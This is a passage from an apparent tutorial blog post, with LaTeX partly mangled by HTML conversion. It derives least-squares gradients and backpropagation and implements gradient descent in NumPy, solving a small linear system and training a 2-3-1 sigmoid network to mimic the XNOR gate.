F(\mathbf{x}) &amp;= {||A\mathbf{x}-\mathbf{b}||}<em>{2}^{2} \
&amp;= {({a}</em>{11}{\mathbf{x}}<em>{1} + {a}</em>{12}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{1})}^{2} +
{({a}<em>{21}{\mathbf{x}}</em>{1} + {a}<em>{22}{\mathbf{x}}</em>{2}-{\mathbf{b}}_{2})}^{2} \
\end{aligned}
$$</p>
<p>Now we calculate the Final Gradient by calculating the individual derivative for every value.</p>
<p>$$
\begin{aligned}
\frac{\partial F(\mathbf{x})}{\partial\mathbf{x}} &amp;=
\begin{bmatrix}
\frac{\partial F(\mathbf{x})}{\partial{\mathbf{x}}<em>{1}} &amp; \frac{\partial F(\mathbf{x})}{\partial{\mathbf{x}}</em>{2}}
\end{bmatrix}\
\frac{\partial F(\mathbf{x})}{\partial{\mathbf{x}}<em>{1}} &amp;= 2{a}</em>{11}({a}<em>{11}{\mathbf{x}}</em>{1} + {a}<em>{12}{\mathbf{x}}</em>{2}-{\mathbf{b}}<em>{1}) + 2{a}</em>{21}({a}<em>{21}{\mathbf{x}}</em>{1} + {a}<em>{22}{\mathbf{x}}</em>{2}-{\mathbf{b}}<em>{2})\
\frac{\partial F(\mathbf{x})}{\partial{\mathbf{x}}</em>{2}} &amp;= 2{a}<em>{12}({a}</em>{11}{\mathbf{x}}<em>{1} + {a}</em>{12}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{1}) + 2{a}<em>{22}({a}</em>{21}{\mathbf{x}}<em>{1} + {a}</em>{22}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{2})\
\frac{\partial F(\mathbf{x})}{\partial\mathbf{x}} &amp;=
\begin{bmatrix}
2{a}<em>{11}({a}</em>{11}{\mathbf{x}}<em>{1} + {a}</em>{12}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{1}) + 2{a}<em>{21}({a}</em>{21}{\mathbf{x}}<em>{1} + {a}</em>{22}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{2}) &amp; 2{a}<em>{12}({a}</em>{11}{\mathbf{x}}<em>{1} + {a}</em>{12}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{1}) + 2{a}<em>{22}({a}</em>{21}{\mathbf{x}}<em>{1} + {a}</em>{22}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{2})
\end{bmatrix}\
&amp;= 2
\begin{bmatrix}
{a}<em>{11}{\mathbf{x}}</em>{1} + {a}<em>{12}{\mathbf{x}}</em>{2}-{\mathbf{b}}<em>{1} &amp;
{a}</em>{21}{\mathbf{x}}<em>{1} + {a}</em>{22}{\mathbf{x}}<em>{2}-{\mathbf{b}}</em>{2}
\end{bmatrix}
\begin{bmatrix}
{a}<em>{11} &amp; {a}</em>{12} \
{a}<em>{21} &amp; {a}</em>{22} \
\end{bmatrix} = 2{(A\mathbf{x}-\mathbf{b})}^{T}A
\end{aligned}
$$</p>
<p>As we can see from that last step, its pretty complex an expression, but you can see how neat matrix notation is as compared to writing all that out and you see how matrix calculus works. With numerator layout, its very similar to single-variable but with a few extra steps.</p>
<p>I then transpose the derivative back into the denominator layout written below. The step function is also written below which we will use for the gradient descent.</p>
<p>$$
\begin{aligned}
F(\mathbf{x}) &amp;= {||A\mathbf{x}-\mathbf{b}||}^{2} \
\nabla F(\mathbf {x} ) &amp;= 2 A^{T}(A\mathbf {x} -\mathbf{b}) \
\mathbf{x}<em>{n+1} &amp;= \mathbf{x}</em>{n}-\gamma \nabla F(\mathbf {x} _{n})
\end{aligned}
$$</p>
<p>where $\gamma$ is the learning rate, we need a small learning rate as it prevents the function from taking large steps and objective functions tend to overblow the &quot;true&quot; error of a function. </p>
<p>We can now implement this in code form for a very simple linear system written below:</p>
<p>$$
\begin{aligned}
w+3x+2y-z=9\
5w+2x+y-2z=4\
x+2y+4z=24\
w+x-y-3z=-12
\end{aligned}
$$</p>
<p>This can be written as such in matrix form:</p>
<h1 id="-beginbmatrix-1--3--2---1-5--2--1---2-0--1--2--4-1--1---1---3-endbmatrix-beginbmatrix-w-x-y-z-endbmatrix">$$
\begin{bmatrix}
1 &amp; 3 &amp; 2 &amp; -1\
5 &amp; 2 &amp; 1 &amp; -2\
0 &amp; 1 &amp; 2 &amp; 4\
1 &amp; 1 &amp; -1 &amp; -3
\end{bmatrix}
\begin{bmatrix}
w\
x\
y\
z
\end{bmatrix}</h1>
<p>\begin{bmatrix}
9\
4\
24\
-12
\end{bmatrix}
$$</p>
<h3 id="code-implementation">Code Implementation</h3>
<h4 id="variables">Variables</h4>
<p>$$
A=
\begin{bmatrix}
1 &amp; 3 &amp; 2 &amp; -1\
5 &amp; 2 &amp; 1 &amp; -2\
0 &amp; 1 &amp; 2 &amp; 4\
1 &amp; 1 &amp; -1 &amp; -3
\end{bmatrix}
$$</p>
<pre><code class="language-python">&gt;&gt;&gt; A = np.array([[1,3,2,-1],[5,2,1,-2],[0,1,2,4],[1,1,-1,-3]], dtype=np.float64)
&gt;&gt;&gt; A
array([[ 1.,  3.,  2., -1.],
       [ 5.,  2.,  1., -2.],
       [ 0.,  1.,  2.,  4.],
       [ 1.,  1., -1., -3.]])
</code></pre>
<p>$$
\mathbf{b}=
\begin{bmatrix}
9\
4\
24\
-12
\end{bmatrix}
$$</p>
<pre><code class="language-python">&gt;&gt;&gt; b = np.array([[9],[4],[24],[-12]], dtype=np.float64) 
&gt;&gt;&gt; b
array([[  9.],
       [  4.],
       [ 24.],
       [-12.]])
</code></pre>
<p>$$
\mathbf{x}=
\begin{bmatrix}
w\
x\
y\
z
\end{bmatrix}
$$</p>
<pre><code class="language-python">&gt;&gt;&gt; x = np.random.rand(4,1)
&gt;&gt;&gt; x
array([[0.09257854],
       [0.16847643],
       [0.39120624],
       [0.78484474]])
</code></pre>
<h4 id="the-objective-function-and-its-derivative">The Objective Function and its Derivative</h4>
<p>$$
F(\mathbf{x}) = {||A\mathbf{x}-\mathbf{b}||}^{2}
$$</p>
<pre><code class="language-python">&gt;&gt;&gt; def objective_function(x):
        return np.linalg.norm(np.matmul(A,x) - b) ** 2
</code></pre>
<p>$$
\nabla F(\mathbf {x} )=2A^{T}(A\mathbf {x} -\mathbf {b})
$$</p>
<pre><code class="language-python">&gt;&gt;&gt; def objective_function_derivative(x):
        return 2 * np.matmul(A.T, np.matmul(A,x) - b)
</code></pre>
<p>In this case, I implemented an arbritary learning rate and arbritary step count. In traditional non-machine learning gradient descent, the learning rate changes per step and is determined via a heuristic such as the Barzilai–Borwein method, however this is not necessary as gradient descent is very robust. I used an arbritary step count for simplicity but you should ideally use some sort of boolean condition to break the loop such as $F(\mathbf{x})&lt;0.01$.</p>
<p>$$
\mathbf {x}<em>{n+1}=\mathbf {x}</em>{n}-\gamma \nabla F(\mathbf {x} _{n})
$$</p>
<pre><code class="language-python">&gt;&gt;&gt; learning_rate = 0.01
&gt;&gt;&gt; for i in range(5000):
        x -= learning_rate * objective_function_derivative(x)
&gt;&gt;&gt; x
array([[1.],
       [2.],
       [3.],
       [4.]])
</code></pre>
<p>And to check, we now use a simple matrix multiplication:</p>
<pre><code class="language-python">&gt;&gt;&gt; np.matmul(A,x)
array([[  9.],
       [  4.],
       [ 24.],
       [-12.]])
</code></pre>
<p>Voila, we have solved the equation with gradient descent, and the solution is super close. This shows the power of gradient descent.</p>
<h2 id="deep-neural-network-layer">Deep Neural Network Layer</h2>
<p>To understand the math behind a deep neural network layer, we will first look at the single perceptron case.</p>
<p><img src="./single_perceptron_example.png" alt="single perceptron example"></p>
<p>$$
z=xw+b\
a=\sigma (z)
$$</p>
<p>where $w$ is the weight, $b$ is the bias, $x$ is the input, $\sigma$ is the activation function and $a$ is the output.</p>
<p>We assume that this is a single layer network and that the loss function is just applied after, and we will just use the MSE loss.</p>
<p>$$c = {(a-y)}^2$$</p>
<p>where $y$ is the true y, $c$ is the cost.</p>
<p>In this case, it is quite easy to represent. Let us expand it to a layer with 4 input neurons and 4 output neurons.</p>
<p><img src="./multiple_perceptron_example.png" alt="multiple perceptron example"></p>
<p>$$
\begin{aligned}
{w}<em>{11}{x}</em>{1} + {w}<em>{21}{x}</em>{2} + {w}<em>{31}{x}</em>{3} + {w}<em>{41}{x}</em>{4} + {b}<em>{1} = &amp;{z}</em>{1}\
{w}<em>{12}{x}</em>{1} + {w}<em>{22}{x}</em>{2} + {w}<em>{32}{x}</em>{3} + {w}<em>{42}{x}</em>{4} + {b}<em>{2} = &amp;{z}</em>{2}\
{w}<em>{13}{x}</em>{1} + {w}<em>{23}{x}</em>{2} + {w}<em>{33}{x}</em>{3} + {w}<em>{43}{x}</em>{4} + {b}<em>{3} = &amp;{z}</em>{3}\
{w}<em>{14}{x}</em>{1} + {w}<em>{24}{x}</em>{2} + {w}<em>{34}{x}</em>{3} + {w}<em>{44}{x}</em>{4} + {b}<em>{4} = &amp;{z}</em>{4}\
{a}<em>{1}=\sigma(&amp;{z}</em>{1})\
{a}<em>{2}=\sigma(&amp;{z}</em>{2})\
{a}<em>{3}=\sigma(&amp;{z}</em>{3})\
{a}<em>{4}=\sigma(&amp;{z}</em>{4})\
c = \frac{1}{4} \left((a_1-y_1)^2 + (a_2 - y_2)^2 + (a_3 - y_3)^2 + (a_4 - y_4)^2\right)
\end{aligned}
$$</p>
<p>As you can see, this is just a linear system much like the one showed in the example and it becomes very simple.</p>
<p>$$
\begin{aligned}
\mathbf{z} &amp;= W\mathbf{x} + \mathbf{b}\
\mathbf{a} &amp;= \sigma(\mathbf{z}) \
c &amp;= \frac{1}{n} ||\mathbf{a} - \mathbf{y}||^2_2
\end{aligned}
$$</p>
<p>From our work earlier we know that:</p>
<p>$$
\begin{aligned}
\frac{\partial \mathbf{z}}{\partial \mathbf{b}}&amp;=I \
\frac{\partial \mathbf{z}}{\partial \mathbf{x}}&amp;= W \
\frac{\partial c}{\partial \mathbf{a}} &amp;= \frac{2}{n} \left(\mathbf{a} - \mathbf{y} \right)^\text{T}
\end{aligned}
$$</p>
<p>However we have once again hit a speedbump. How do we find the derivative of a vector $\mathbf{z}$ with respect to a matrix $W$? The function is of the form $f:\mathbb{R}^{m \times n} \rightarrow \mathbb{R}^{m}$. Hence, the derivative will be a third order tensor also known as a 3D matrix. (colloquially) But for now we will use a trick to dodge the usage of third order tensors because of the nature of the function $W\mathbf{x}$. For this example, I use $m=3$ and $n=2$ but its generalizable for any sizes.</p>
<p>$$
\begin{aligned}
\mathbf{z} = W\mathbf{x} + \mathbf{b}\
\begin{bmatrix}
{\mathbf{z}}<em>{1} \
{\mathbf{z}}</em>{2} \
{\mathbf{z}}<em>{3}
\end{bmatrix} &amp;= \begin{bmatrix}
{w}</em>{11} &amp; {w}<em>{12}\
{w}</em>{21} &amp; {w}<em>{22}\
{w}</em>{31} &amp; {w}<em>{32}\
\end{bmatrix}
\begin{bmatrix}
{\mathbf{x}}</em>{1} \
{\mathbf{x}}<em>{2}
\end{bmatrix}
+
\begin{bmatrix}
{\mathbf{b}}</em>{1} \
{\mathbf{b}}<em>{2} \
{\mathbf{b}}</em>{3}
\end{bmatrix} \
&amp;=
\begin{bmatrix}
{w}<em>{11}{\mathbf{x}}</em>{1} + {w}<em>{12}{\mathbf{x}}</em>{2} + {\mathbf{b}}<em>{1}\
{w}</em>{21}{\mathbf{x}}<em>{1} + {w}</em>{22}{\mathbf{x}}<em>{2} + {\mathbf{b}}</em>{2}\
{w}<em>{31}{\mathbf{x}}</em>{1} + {w}<em>{32}{\mathbf{x}}</em>{2} + {\mathbf{b}}_{3}\
\end{bmatrix}
\end{aligned}
$$</p>
<p>We now calculate the individual derivatives of $\mathbf{z}$ wrt to $W$.</p>
<p>$$
\begin{aligned}
\frac{\partial \mathbf{z}<em>{1}}{\partial w</em>{11}}=\mathbf{x}<em>{1}\quad
\frac{\partial \mathbf{z}</em>{2}}{\partial w_{11}}=0\quad
\frac{\partial \mathbf{z}<em>{3}}{\partial w</em>{11}}=0\
\frac{\partial \mathbf{z}<em>{1}}{\partial w</em>{12}}=\mathbf{x}<em>{2}\quad
\frac{\partial \mathbf{z}</em>{2}}{\partial w_{12}}=0\quad
\frac{\partial \mathbf{z}<em>{3}}{\partial w</em>{12}}=0\
\frac{\partial \mathbf{z}<em>{1}}{\partial w</em>{21}}=0\quad
\frac{\partial \mathbf{z}<em>{2}}{\partial w</em>{21}}=\mathbf{x}<em>{1}\quad
\frac{\partial \mathbf{z}</em>{3}}{\partial w_{21}}=0\
\frac{\partial \mathbf{z}<em>{1}}{\partial w</em>{22}}=0\quad
\frac{\partial \mathbf{z}<em>{2}}{\partial w</em>{22}}=\mathbf{x}<em>{2}\quad
\frac{\partial \mathbf{z}</em>{3}}{\partial w_{22}}=0\
\frac{\partial \mathbf{z}<em>{1}}{\partial w</em>{31}}=0\quad
\frac{\partial \mathbf{z}<em>{2}}{\partial w</em>{31}}=0\quad
\frac{\partial \mathbf{z}<em>{3}}{\partial w</em>{31}}=\mathbf{x}<em>{1}\
\frac{\partial \mathbf{z}</em>{1}}{\partial w_{32}}=0\quad
\frac{\partial \mathbf{z}<em>{2}}{\partial w</em>{32}}=0\quad
\frac{\partial \mathbf{z}<em>{3}}{\partial w</em>{32}}=\mathbf{x}_{2}\
\end{aligned}
$$</p>
<p>We see that this is a pretty complex looking tensor but we see that a majority of the values are 0 allowing us to pull of an epic hack by considering the fact that at the end we are essentially trying to get a singular scalar value (the loss) and find the partial derivative of that wrt to $W$. There are some steps involved in getting from $\mathbf{z}$ to $c$ but for simplicity instead of showing everything, we will condense all of this into a function $f:\mathbb{R}^{n} \rightarrow \mathbb{R}$ which is defined as $c=f(\mathbf{z})$. In this case, we know the tensor values and we know the gradient and what the derivative should be. Hence, we now just evaluate it and see if we can see any property:</p>
<h1 id="-beginaligned-fracpartial-cpartialmathbfz---beginbmatrix-fracpartial-cpartialmathbfz1--fracpartial-cpartialmathbfz2--fracpartial-cpartialmathbfz2-endbmatrix--fracpartial-cpartial-w---beginbmatrix-fracpartial-cpartialw11--fracpartial-cpartialw21--fracpartial-cpartialw31-fracpartial-cpartialw12--fracpartial-cpartialw22--fracpartial-cpartialw_32-endbmatrix">$$
\begin{aligned}
\frac{\partial c}{\partial\mathbf{z}} &amp;= 
\begin{bmatrix}
\frac{\partial c}{\partial{\mathbf{z}}<em>{1}} &amp; \frac{\partial c}{\partial{\mathbf{z}}</em>{2}} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{2}}
\end{bmatrix} \
\frac{\partial c}{\partial W} = 
\begin{bmatrix}
\frac{\partial c}{\partial{w}</em>{11}} &amp; \frac{\partial c}{\partial{w}<em>{21}} &amp; \frac{\partial c}{\partial{w}</em>{31}}\
\frac{\partial c}{\partial{w}<em>{12}} &amp; \frac{\partial c}{\partial{w}</em>{22}} &amp; \frac{\partial c}{\partial{w}_{32}}
\end{bmatrix}</h1>
<h1 id="fracpartial-cpartial-mathbfzfracpartial-mathbfzpartial-mathbfw--beginbmatrix-fracpartial-cpartialmathbfz1fracpartial-mathbfz1partialw11--fracpartial-cpartialmathbfz2fracpartial-mathbfz2partialw21--fracpartial-cpartialmathbfz3fracpartial-mathbfz3partialw31-fracpartial-cpartialmathbfz1fracpartial-mathbfz1partialw12--fracpartial-cpartialmathbfz2fracpartial-mathbfz2partialw22--fracpartial-cpartialmathbfz3fracpartial-mathbfz3partialw32-endbmatrix">\frac{\partial c}{\partial \mathbf{z}}\frac{\partial \mathbf{z}}{\partial \mathbf{W}}
&amp;=
\begin{bmatrix}
\frac{\partial c}{\partial{\mathbf{z}}<em>{1}}\frac{\partial {\mathbf{z}}</em>{1}}{\partial{w}<em>{11}} &amp; \frac{\partial c}{\partial{\mathbf{z}}</em>{2}}\frac{\partial {\mathbf{z}}<em>{2}}{\partial{w}</em>{21}} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{3}}\frac{\partial {\mathbf{z}}</em>{3}}{\partial{w}<em>{31}}\
\frac{\partial c}{\partial{\mathbf{z}}</em>{1}}\frac{\partial {\mathbf{z}}<em>{1}}{\partial{w}</em>{12}} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{2}}\frac{\partial {\mathbf{z}}</em>{2}}{\partial{w}<em>{22}} &amp; \frac{\partial c}{\partial{\mathbf{z}}</em>{3}}\frac{\partial {\mathbf{z}}<em>{3}}{\partial{w}</em>{32}}
\end{bmatrix}</h1>
<h1 id="beginbmatrix-fracpartial-cpartialmathbfz1mathbfx1--fracpartial-cpartialmathbfz2mathbfx1--fracpartial-cpartialmathbfz3mathbfx1-fracpartial-cpartialmathbfz1mathbfx2--fracpartial-cpartialmathbfz2mathbfx2--fracpartial-cpartialmathbfz3mathbfx2-endbmatrix">\begin{bmatrix}
\frac{\partial c}{\partial{\mathbf{z}}<em>{1}}\mathbf{x}</em>{1} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{2}}\mathbf{x}</em>{1} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{3}}\mathbf{x}</em>{1}\
\frac{\partial c}{\partial{\mathbf{z}}<em>{1}}\mathbf{x}</em>{2} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{2}}\mathbf{x}</em>{2} &amp; \frac{\partial c}{\partial{\mathbf{z}}<em>{3}}\mathbf{x}</em>{2}
\end{bmatrix}</h1>
<p>\mathbf{x}\frac{\partial c}{\partial\mathbf{z}}
\end{aligned}
$$</p>
<p>Wonderful, we have just found out this amazing method, where we just add $\mathbf{x}$ to the front. Normally this method is not possible but it is just possible in this special case as we dont have to consider terms such as $\frac{\partial c}{\partial{\mathbf{z}}<em>{2}}\frac{\partial {\mathbf{z}}</em>{2}}{\partial{w}_{11}}$ because they are just 0. It helps us dodge all the possibilites of tensor calculus (at least for now) and allows the NumPy multiplication to be much easier. $f$ can also generalize for any vector to scalar function, not just the specific steps we make.</p>
<p>The next speedbump is much more easier to grasp than the last one, and that is element-wise operations. In this case, we have the activation function $\sigma:\mathbb{R}^{n} \rightarrow \mathbb{R}^{n}$ or $\sigma:\mathbb{R} \rightarrow \mathbb{R}$, which looks like a sigmoid function, but this is just a placeholder function. It can be any $\mathbb{R}$ to $\mathbb{R}$ activation function, such as $\text{RELU}(x) = \text{max}(x, 0)$, or whatever else has been found in research, such as SMELU and GELU. Once again, we work it out for every single value, as shown below:</p>
<h1 id="-beginaligned-mathbfa--sigmamathbfz-beginbmatrix-mathbfa1--mathbfa2--mathbfa3-endbmatrix--sigmaleft-beginbmatrix-mathbfz1--mathbfz2--mathbfz3-endbmatrixright">$$
\begin{aligned}
\mathbf{a} &amp;= \sigma(\mathbf{z})\
\begin{bmatrix}
{\mathbf{a}}<em>{1} \
{\mathbf{a}}</em>{2} \
{\mathbf{a}}<em>{3}
\end{bmatrix}
&amp;=
\sigma\left(
\begin{bmatrix}
{\mathbf{z}}</em>{1} \
{\mathbf{z}}<em>{2} \
{\mathbf{z}}</em>{3}
\end{bmatrix}\right)</h1>
<p>\begin{bmatrix}
\sigma({\mathbf{z}}<em>{1}) \
\sigma({\mathbf{z}}</em>{2}) \
\sigma({\mathbf{z}}_{3})
\end{bmatrix}
\end{aligned}
$$</p>
<p>Now for the 48th billion time, we calculate the Jacobian by calculating every individual derivative to get the general property of the operation.</p>
<p>$$
\begin{aligned}
\frac{\partial \mathbf{a}}{\partial \mathbf{z}} &amp;=
\begin{bmatrix}
\frac{\partial {\mathbf{a}}<em>{1}}{\partial{\mathbf{z}}</em>{1}} &amp; \frac{\partial {\mathbf{a}}<em>{1}}{\partial{\mathbf{z}}</em>{2}}&amp; \frac{\partial {\mathbf{a}}<em>{1}}{\partial{\mathbf{z}}</em>{3}}\
\frac{\partial {\mathbf{a}}<em>{2}}{\partial{\mathbf{z}}</em>{1}} &amp; \frac{\partial {\mathbf{a}}<em>{2}}{\partial{\mathbf{z}}</em>{2}} &amp; \frac{\partial {\mathbf{a}}<em>{2}}{\partial{\mathbf{z}}</em>{3}}\
\frac{\partial {\mathbf{a}}<em>{3}}{\partial{\mathbf{z}}</em>{1}} &amp; \frac{\partial {\mathbf{a}}<em>{3}}{\partial{\mathbf{z}}</em>{2}} &amp; \frac{\partial {\mathbf{a}}<em>{3}}{\partial{\mathbf{z}}</em>{3}}
\end{bmatrix}\
\frac{\partial {\mathbf{a}}<em>{1}}{\partial{\mathbf{z}}</em>{1}}=\sigma^{&#39;}(\mathbf{z}<em>{1})\quad
\frac{\partial {\mathbf{a}}</em>{1}}{\partial{\mathbf{z}}<em>{2}}&amp;=0\quad
\frac{\partial {\mathbf{a}}</em>{1}}{\partial{\mathbf{z}}<em>{3}}=0\
\frac{\partial {\mathbf{a}}</em>{2}}{\partial{\mathbf{z}}<em>{1}}=0\quad
\frac{\partial {\mathbf{a}}</em>{2}}{\partial{\mathbf{z}}<em>{2}}&amp;=\sigma^{&#39;}(\mathbf{z}</em>{2})\quad
\frac{\partial {\mathbf{a}}<em>{2}}{\partial{\mathbf{z}}</em>{3}}=0\
\frac{\partial {\mathbf{a}}<em>{3}}{\partial{\mathbf{z}}</em>{1}}=0\quad
\frac{\partial {\mathbf{a}}<em>{3}}{\partial{\mathbf{z}}</em>{2}}&amp;=0\quad
\frac{\partial {\mathbf{a}}<em>{3}}{\partial{\mathbf{z}}</em>{3}}=\sigma^{&#39;}(\mathbf{z}<em>{3})\
\frac{\partial \mathbf{a}}{\partial \mathbf{z}} &amp;=
\begin{bmatrix}
\sigma^{&#39;}(\mathbf{z}</em>{1}) &amp; 0 &amp; 0\
0 &amp; \sigma^{&#39;}(\mathbf{z}<em>{2}) &amp; 0\
0 &amp; 0 &amp; \sigma^{&#39;}(\mathbf{z}</em>{3})\
\end{bmatrix}
=diag(\sigma^{&#39;}(\mathbf{z}))
\end{aligned}
$$</p>
<p>As you see, we can reduce this derivative to this specific value. I have used the $diag$ operator which converts a vector to a diagonal matrix. Finally, after all this derivation (mathematically and figuratively) we can use chain rule to join everything together:</p>
<p>$$
\begin{aligned}
\frac{\partial c}{\partial \mathbf{b}}=\frac{\partial c}{\partial \mathbf{a}}\frac{\partial \mathbf{a}}{\partial \mathbf{z}}\frac{\partial \mathbf{z}}{\partial \mathbf{b}}
&amp;=
\frac{2}{n}{(\mathbf{a}-\mathbf{y})}^{T}diag(\sigma^{&#39;}(\mathbf{z}))\
\frac{\partial c}{\partial \mathbf{x}}=\frac{\partial c}{\partial \mathbf{a}}\frac{\partial \mathbf{a}}{\partial \mathbf{z}}\frac{\partial \mathbf{z}}{\partial \mathbf{x}}
&amp;=
\frac{2}{n}{(\mathbf{a}-\mathbf{y})}^{T}diag(\sigma^{&#39;}(\mathbf{z}))W\
\frac{\partial c}{\partial W}=\frac{\partial c}{\partial \mathbf{a}}\frac{\partial \mathbf{a}}{\partial \mathbf{z}}\frac{\partial \mathbf{z}}{\partial W}
&amp;=
\frac{2}{n}\mathbf{x}{(\mathbf{a}-\mathbf{y})}^{T}diag(\sigma^{&#39;}(\mathbf{z}))
\end{aligned}
$$</p>
<p>Now that we got these simple definitions for the single-layer case, we can expand it to the multi-layer case.</p>
<p>$$
\begin{aligned}
\mathbf{a}<em>{0}&amp;=\mathbf{x}\
\mathbf{z}</em>{i}&amp;={W}<em>{i-1}{\mathbf{a}}</em>{i-1} + \mathbf{b}<em>{i-1}\
\mathbf{a}</em>{i}&amp;=\sigma(\mathbf{z}<em>{i})\
i &amp;= 1,2,3,...,L\
c&amp;=\frac{1}{n}|{\mathbf{a}-\mathbf {y}}|</em>{2}^{2}
\end{aligned}
$$</p>
<p>We can do the calculus for the $i$-th layer now, specifically for bias and weight using the chain rule.</p>
<p>$$
\begin{aligned}
\frac{\partial c}{\partial \mathbf{b}<em>{i-1}}=\frac{\partial c}{\partial \mathbf{a}</em>{L}}\frac{\partial \mathbf{a}<em>L}{\partial \mathbf{z}</em>{L}}\frac{\partial \mathbf{z}<em>{L}}{\partial \mathbf{a}</em>{L-1}}\cdots\frac{\partial \mathbf{a}<em>{i}}{\partial \mathbf{z}</em>{i}}\frac{\partial \mathbf{z}<em>{i}}{\partial \mathbf{b}</em>{i-1}}&amp;=
\frac{2}{n}{(\mathbf{a}<em>L-\mathbf{y})}^{T}diag(\sigma^{&#39;}(\mathbf{z}<em>L))W</em>{L-1}\cdots diag(\sigma^{&#39;}(\mathbf{z}<em>i))\
\frac{\partial c}{\partial W</em>{i-1}}=\frac{\partial c}{\partial \mathbf{a}</em>{L}}\frac{\partial \mathbf{a}<em>L}{\partial \mathbf{z}</em>{L}}\frac{\partial \mathbf{z}<em>{L}}{\partial \mathbf{a}</em>{L-1}}\cdots\frac{\partial \mathbf{a}<em>{i}}{\partial \mathbf{z}</em>{i}}\frac{\partial \mathbf{z}<em>{i}}{\partial W</em>{i-1}}&amp;=
\frac{2}{n}\mathbf{a}_{i-1}{(\mathbf{a}_L-\mathbf{y})}^{T}diag(\sigma^{&#39;}(\mathbf{z}<em>L))W</em>{L-1}\cdots diag(\sigma^{&#39;}(\mathbf{z}_i))\
i &amp;= 1,2,3,...,L
\end{aligned}
$$</p>
<p>Now it is time to actually implement this network (finally).</p>
<h2 id="neural-network-implementation-xnor-gate">Neural Network Implementation (XNOR Gate)</h2>
<p>I couldn&#39;t find a good, but rather small dataset because most people really do like large datasets and are infuriated when they are not provided that like <del>entitled brats</del> normal people. So, instead, I decided that we will train our neural network to mimic the XNOR gate.</p>
<p>Oh no! Training? Testing? What is that? In all fairness, I am simply trying to show you that the mathematical functions that dictate neural networks as we have found above, fits perfectly with this task of a neural network, and that these neural networks that everyone hears about can really just mimic any function.</p>
<p><img src="./XNOR_input_output.png" alt="XNOR input output"></p>
<p>For those who do not know, the XNOR gates inputs and outputs are written above. It is pretty suitable for this example, because the inputs and outputs are all 0 and 1, hence it is fast to train and there is no bias in the data.</p>
<p>From here, let&#39;s try coding out the (x,y) pairs in NumPy:</p>
<pre><code class="language-python">data = [[np.array([[0],[0]], dtype=np.float64),np.array([[1]], dtype=np.float64)],
        [np.array([[0],[1]], dtype=np.float64),np.array([[0]], dtype=np.float64)],
        [np.array([[1],[0]], dtype=np.float64),np.array([[0]], dtype=np.float64)],
        [np.array([[1],[1]], dtype=np.float64),np.array([[1]], dtype=np.float64)]]
</code></pre>
<p>We then define a network structure. It doesn&#39;t have to be too complex because it is a pretty simple function. I decided on a $2 \rightarrow 3 \rightarrow 1$ multi-layer perceptron (MLP) structure, with the sigmoid activation function.</p>
<p><img src="./multiple_perceptron_network.png" alt="multiple perceptron network"></p>
<p>Next, let&#39;s try coding out our mathematical work based off the following class:</p>
<pre><code class="language-python">class NNdata:
    def __init__(self):
        self.a_0 = None
        self.W_0 = np.random.rand(3,2)
        self.b_0 = np.random.rand(3,1)
        self.z_1 = None
        self.a_1 = None
        self.W_1 = np.random.rand(1,3)
        self.b_1 = np.random.rand(1,1)
        self.z_2 = None
        self.a_2 = None
        self.db_1 = None
        self.dw_1 = None
        self.db_0 = None
        self.dw_0 = None
        
    def sigmoid(self, x):
        return 1 / (1 + np.exp(-x))
    
    def sigmoid_derivative(self, x):
        return self.sigmoid(x) * (1 - self.sigmoid(x))
    
    def feed_forward(self, x):
        self.a_0 = x
        
        self.z_1 = np.matmul(self.W_0, self.a_0)+self.b_0
        self.a_1 = self.sigmoid(self.z_1)
        
        self.z_2 = np.matmul(self.W_1, self.a_1)+self.b_1
        self.a_2 = self.sigmoid(self.z_2)
        return self.a_2
        
    def loss(self, y):
        return np.linalg.norm(self.a_2-y)**2
    
    def back_prop(self, y):
        dcdz_2 = 2 * np.matmul((self.a_2-y).T,np.diag(self.sigmoid_derivative(self.z_2).reshape(1)))
        dcdb_1 = dcdz_2
        dcdw_1 = np.matmul(self.a_1, dcdz_2)
        
        dcda_1 = np.matmul(dcdz_2, self.W_1)
        dcdz_1 = np.matmul(dcda_1, np.diag(self.sigmoid_derivative(self.z_1).reshape(3)))
        dcdb_0 = dcdz_1
        dcdw_0 = np.matmul(self.a_0, dcdz_1)
        
        self.db_1 = dcdb_1.T
        self.dw_1 = dcdw_1.T
        self.db_0 = dcdb_0.T
        self.dw_0 = dcdw_0.T
</code></pre>
<p>Next I program gradient descent. There are 3 kinds of gradient descent when there are multiple datapoints, Stochastic, Batch and Mini-Batch. In Stochastic Gradient Descent (SGD), the weights are updated after a single sample is run. This will obviously cause your step towards the ideal value be very chaotic. In Batch Gradient Descent, the weights are updated after every sample is run, and the net step is the sum/average of all the $\nabla F(x)$, which is less chaotic, but steps are less frequent.</p>
<p>Of course, in real life, we can never know which algorithm is better without making an assumption about the data. (No Free Lunch Theorem) A good compromise is Mini-Batch Gradient Descent, which is like Batch Gradient Descent but use smaller chunks of all the datapoints every step. In this case, I use Batch Gradient Descent.</p>
<pre><code class="language-python">nndata = NNdata()
learning_rate = 0.1
for i in range(10000):
    db_1_batch = []
    dw_1_batch = []
    db_0_batch = []
    dw_0_batch = []
    c = []
    for j in range(4):
        nndata.feed_forward(data[j][0])
        c.append(nndata.loss(data[j][1]))
        nndata.back_prop(data[j][1])
        db_1_batch.append(nndata.db_1)
        dw_1_batch.append(nndata.dw_1)
        db_0_batch.append(nndata.db_0)
        dw_0_batch.append(nndata.dw_0)
    if((i+1) % 1000 == 0):
        print(&quot;loss (%d/10000): %.3f&quot; % (i+1, sum(c)/4))
    nndata.b_1 -= learning_rate * sum(db_1_batch)
    nndata.W_1 -= learning_rate * sum(dw_1_batch)
    nndata.b_0 -= learning_rate * sum(db_0_batch)
    nndata.W_0 -= learning_rate * sum(dw_0_batch)
</code></pre>
<p>Output resource:</p>
<pre><code>loss (1000/10000): 0.245
loss (2000/10000): 0.186
loss (3000/10000): 0.029
loss (4000/10000): 0.007
loss (5000/10000): 0.003
loss (6000/10000): 0.002
loss (7000/10000): 0.002
